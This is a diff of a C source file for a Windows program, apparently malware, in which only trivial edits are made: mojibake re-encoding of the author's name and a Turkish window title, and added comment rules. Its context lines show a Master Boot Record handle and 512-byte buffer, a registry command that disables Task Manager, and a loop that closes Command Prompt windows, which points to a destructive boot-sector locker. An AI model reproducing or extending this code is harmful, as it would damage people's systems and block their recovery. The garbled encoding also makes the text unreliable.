@@ -1,6 +1,6 @@
 /*
 
-Copyright 2018 Mehmet ÷ZG‹N
+Copyright 2018 Mehmet √ñZG√úN
 
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the 
 Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the
@@ -28,7 +28,7 @@ HWND hwnd;
 int  WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 {
 	hwnd = NULL;
-
+/////////////////////////////////////////////////////////////
 	DWORD write;
 	
 	char mbrData[512];
@@ -44,13 +44,13 @@ int  WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 
 		}
 		CloseHandle(MasterBootRecord);
-		
+////////////////////////////////////////////////////////////////////////////
 	system("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System / v DisableTaskMgr / t REG_DWORD / d 1 / f");
 	while (1)
 	{
 		
 		
-		if ((hwnd = FindWindow(NULL, "Komut ›stemi")) != NULL)
+		if ((hwnd = FindWindow(NULL, "Komut √ùstemi")) != NULL)
 		{
 		
 			CloseWindow(hwnd);
